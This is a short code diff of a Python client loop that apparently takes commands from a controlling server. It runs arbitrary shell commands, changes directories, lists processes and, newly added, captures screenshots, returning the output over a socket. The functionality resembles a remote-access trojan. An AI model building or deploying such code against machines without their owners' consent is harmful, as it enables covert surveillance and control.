@@ -545,6 +545,10 @@ def reactor():
                                             UNLOCKED = False
                                             continue
 
+                                        # Terminate Client
+                                        if data['payload'] == 'terminateClient':
+                                            os._exit(1)
+
                                         # Choose dir
                                         elif data['payload'].startswith('cd '):
                                             try:
@@ -552,6 +556,9 @@ def reactor():
                                                 output = ''
                                             except:
                                                 output = 'dirOpenError'
+
+                                        elif data['payload'] == 'getScreen':
+                                            output = get_screenshot()
 
                                         # Get Processes List
                                         elif data['payload'] == 'getProcessesList':
@@ -566,7 +573,7 @@ def reactor():
                                         # Run Shell
                                         else:
                                             output = run_shell(data['payload'])
-                                        data_send(server_socket, output, 'shellMode', session_id=data['session_id'])
+                                        data_send(server_socket, output, 'clientMode', session_id=data['session_id'])
 
                                     except socket.error:
                                         break
